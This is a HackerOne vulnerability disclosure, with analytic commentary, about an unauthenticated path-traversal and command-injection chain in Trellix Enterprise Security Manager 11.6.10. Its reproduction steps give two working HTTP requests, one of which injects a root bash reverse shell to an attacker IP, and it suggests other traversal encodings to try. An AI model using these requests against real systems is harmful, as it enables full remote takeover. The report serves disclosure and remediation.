# Unauthenticated Path Traversal and Command Injection in Trellix Enterprise Security Manager 11.6.10

## Metadata
- **Source:** HackerOne
- **Report:** 2817658 | https://hackerone.com/reports/2817658
- **Submitted:** 2024-11-02
- **Reporter:** r4v
- **Program:** Trellix Enterprise Security Manager (ESM)
- **Bounty:** Not specified in report
- **Severity:** Critical
- **Vuln:** Path Traversal, Command Injection, Improper Access Control, Insecure Proxy Configuration
- **CVEs:** None
- **Category:** memory-binary

## Summary
Trellix ESM 11.6.10 allows unauthenticated remote code execution through a combination of path traversal and command injection vulnerabilities. An attacker can bypass authentication using the `..;/` traversal sequence to access internal Snowservice APIs, then execute arbitrary commands as root via the ManageNode endpoint.

## Attack scenario
1. Attacker identifies ESM instance exposed on network and probes for accessible endpoints
2. Attacker crafts HTTP request using `..;/` path traversal sequence to bypass proxy access controls on `/rs` path
3. Request reaches internal AJP service at localhost:8009, exposing unauthenticated Snowservice APIs
4. Attacker sends JSON payload to CreateNode endpoint to create a node entry without authentication
5. Attacker submits ManageNode request with command injection payload in the 'name' parameter (backtick-wrapped bash command)
6. Command executes as root user, establishing reverse shell and providing complete system compromise

## Root cause
Multiple design flaws: (1) Apache ProxyPass configuration forwards requests to AJP backend without path normalization, (2) `..;/` sequence bypasses path validation by exploiting differences in HTTP parser vs application parser logic, (3) Internal Snowservice APIs lack authentication checks, (4) User input in ManageNode endpoint passed unsanitized to system command execution

## Attacker mindset
Opportunistic attacker exploiting publicly disclosed parser-bypass techniques (Orange Tsai Black Hat 2018) combined with common insecure configuration patterns. The use of public trial VMs suggests reconnaissance of easily accessible targets. The escalation from path traversal to RCE demonstrates chaining of multiple weaknesses for maximum impact.

## Defensive takeaways
- Implement strict input validation and sanitization for all user inputs, especially those passed to system commands or file operations
- Apply authentication and authorization checks at the application layer, not just proxy layer, for all API endpoints
- Use safe command execution libraries instead of shell interpretation; avoid backticks, eval, or similar dynamic code execution
- Normalize and validate all paths before proxy forwarding; use allowlisting rather than blocklisting for path validation
- Ensure AJP/proxy services do not expose internal-only APIs; use network segmentation and firewall rules to restrict backend access
- Implement consistent path normalization across all parsing layers (HTTP parser, application parser, filesystem)
- Apply principle of least privilege; run services with minimal required permissions (not root)
- Disable or restrict AJP if not required; use alternative proxying mechanisms with better security controls
- Perform regular security audits of proxy configurations and access control lists

## Variant hunting
Search for similar patterns in other Trellix products and versions using AJP proxying. Investigate other endpoints behind the `/rs/` path for similar vulnerabilities. Test other path traversal sequences (e.g., `..;`, `%2e%2e;/`) against proxy configurations. Check for command injection in other JSON parameters across Snowservice endpoints. Review other internal service APIs exposed through similar proxy configurations.

## MITRE ATT&CK
- T1190
- T1059
- T1021
- T1548
- T1105
- T1656

## Notes
This vulnerability exemplifies the danger of chaining multiple weaknesses: path traversal + authentication bypass + command injection. The `..;/` technique is well-documented but still effective against misconfigurations. The fact that the trial version is publicly accessible made this easily discoverable. Root privilege execution is particularly critical for infrastructure management tools like SIEM. The report demonstrates good proof-of-concept with concrete HTTP requests and reverse shell evidence.

## Full report
<details><summary>Expand</summary>

**Product:** Trellix Enterprise Security Manager (ESM)

**Version Tested:** 11.6.10

**Source:** Publicly available trial version from [Trellix Trials](https://www.trellix.com/downloads/trials/?selectedTab=siem) — "Trellix Enterprise Security Manager, Event Receiver & Log Manager VM for SIEM v11.6.10."

**Potentially Affected Versions:** Latest version could also be vulnerable

**Vulnerability Type:** Path Traversal, Command Injection

**Severity:** Critical

---

## Summary:
A critical vulnerability in Trellix Enterprise Security Manager (ESM) version 11.6.10 allows **unauthenticated** access to the internal `Snowservice` API and enables remote code execution through command injection, executed as the root user. This vulnerability results from multiple flaws in the application's design and configuration, including improper handling of path traversal, insecure forwarding to an AJP backend without adequate validation, and lack of authentication for accessing internal API endpoints.

The root cause lies in the way the ESM forwards requests to the AJP service using `ProxyPass`, specifically configured as:

```apache
ProxyPass         /rs  ajp://localhost:8009/rs
```

This configuration permits unintended external access to internal paths by leveraging the `..;/` traversal sequence, which bypasses typical directory restrictions. This technique is further explained in **Breaking Parser Logic: Take Your Path Normalization Off and Pop 0days Out** by Orange Tsai at Black Hat USA 2018 ([source](https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf)). The `..;/` sequence bypasses common path validation checks, making it possible to access restricted internal APIs. Combined with command injection vulnerabilities, this leads to a critical security risk.

---

## Product reports - releases affected:
Wherever possible, please test against the latest released version.
  * Tested on Trellix Enterprise Security Manager version 11.6.10 (Linux)
  * Other versions may also be affected (please verify)

---

## Website reports - browsers verified in:
Please provide the full URL.
  * Tested via HTTP requests (no specific browser required)

---

## Steps to reproduce:
1. Access the `/rs/..;/Snowservice/SnowflexAdminServices/CreateNode` endpoint without authentication to confirm unauthenticated access.
2. Submit a request to the `CreateNode` endpoint to verify unauthorized path traversal access to the internal API.
3. Exploit command injection via the `ManageNode` endpoint to execute commands with root privileges.

### Step 1: Unauthenticated API Access via Path Traversal

The following request demonstrates unauthenticated access to the internal API:

#### Request Example:
```http
POST /rs/..;/Snowservice/SnowflexAdminServices/CreateNode HTTP/1.0
Host: [ESM IP]
Accept: application/json
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.59 Safari/537.36
Content-Length: 118

{
    "serverName": "test132", 
    "ip": "127.0.0.1",
    "port": "1212",
    "peerPort": "1210"
}
```

### Step 2: Remote Code Execution via Command Injection with Root Privileges

The following command injection payload in the `name` parameter provides remote root access:

#### Request Example:
```http
POST /rs/..;/Snowservice/SnowflexAdminServices/ManageNode HTTP/1.0
Host: [ESM IP]
Accept: application/json
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.59 Safari/537.36
Content-Length: 186

{
    "serverName": "test132",
    "processes": [
        {
            "name": "`bash -i >& /dev/tcp/[Attacker IP]/2137 0>&1`", 
            "signal": "Restart"
        }
    ]
}
```

This payload opens a reverse shell to the attacker’s machine, providing root access and full control over the system.

---

## Supporting material/references:
* **Screenshot 1**: screenshot.png - This screenshot shows the HTTP request used to exploit the command injection vulnerability and the reverse shell connection received by the attacker.
* **Screenshot 2**: screenshot2.png - This screenshot displays the process list on the compromised system, showing the injected command being executed as root. It also shows the whole command executed.

---

## Impact

Exploiting this vulnerability allows an attacker to:
- Gain **unauthenticated** access to internal API endpoints through path traversal.
- Execute arbitrary commands as root, compromising the system entirely.

The impact of this vulnerability is rated **Critical** due to the combination of unauthenticated path traversal, insecure proxy forwarding, and command injection.

---

## Recommendations

1. **Secure AJP Proxy Configuration**
   - Review and restrict `ProxyPass` configurations. Ensure that internal paths are only accessible from trusted sources and prevent external access.
   - Avoid using ambiguous path traversal characters like `..;/` by implementing additional path validation for all forwarded requests.

2. **Path Validation and Access Control**
   - Implement robust path validation to reject sequences like `..;/` that enable unauthorized access.
   - Ensure access controls are in place for internal APIs, blocking all unauthorized users and enforcing authentication.

3. **Command Injection Prevention**
   - Enforce strict input sanitization, especially for sensitive parameters like `name`. Reject special characters and command syntax in user inputs.
   - Implement whitelisting of acceptable commands and arguments to prevent arbitrary code execution.

4. **Principle of Least Privilege**
   - Avoid running the service as root to reduce potential damage if an exploit occurs.

---

## Impact Summary

This vulnerability in Trellix ESM 11.6.10 allows **unauthenticated** access to an internal API through path traversal enabled by insecure AJP forwarding and lacks input validation, permitting command injection with root execution. Confirmed on the publicly available trial version, this vulnerability likely affects other versions and requires urgent remediation.

---

## Note to Vendor

It is recommended that Trellix verify which versions of the software are affected by this vulnerability. This issue may not be limited to version 11.6.10 and could impact previous versions as well. A thorough review of historical versions is advised to assess the scope of this vulnerability and ensure proper patching across affected releases.

**Thank you for reviewing this report. I am available for any further questions or additional information.**

**Best Regards,**  
Rafal Gill (r4v)

</details>

---
*Analysed by Claude on 2026-05-24*
